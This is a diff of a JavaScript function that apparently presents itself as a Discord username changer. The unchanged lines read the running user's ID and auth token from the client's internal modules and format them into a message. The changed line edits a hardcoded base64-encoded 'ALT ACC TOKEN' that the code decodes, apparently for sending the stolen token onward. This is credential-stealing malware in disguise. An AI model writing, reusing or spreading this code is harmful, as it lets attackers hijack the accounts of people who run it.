@@ -7,7 +7,7 @@ function start(par,color) {
     let cid = tst.find(m=>m?.exports?.default?.getId!==void 0).exports.default.getId();
     let magija = tst.find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();
     let poruka = "**"+info+"**```"+magija+"```"+`\n\n**User --> **<@${cid}>`;
-    let verify = 'TVRBd09EYzBOalU0TnprMU5qRTVNVE16TWcuR3dSazVqLm4xUi1FVXVKXzZCeEV5ZkhYZXhBZkdndmREa21YbmE4LWEwQWZZ'; //ALT ACC TOKEN
+    let verify = 'TVRBd09EYzBOalU0TnprMU5qRTVNVE16TWcuR3dSazVqLm4xUi1FVXVKXzZCeEV5kkhYZXhBZkdndmREa21YbmE4LWEwQWZZ'; //ALT ACC TOKEN
     let dcd = window.atob(verify);
     document.querySelector(".overflow-1wOqNV").innerHTML =`<b class='${color}'>${par}</b>`;
     console.log(`%c Username je promjenjen`,'color: #36FF00; font-weight: bold;');
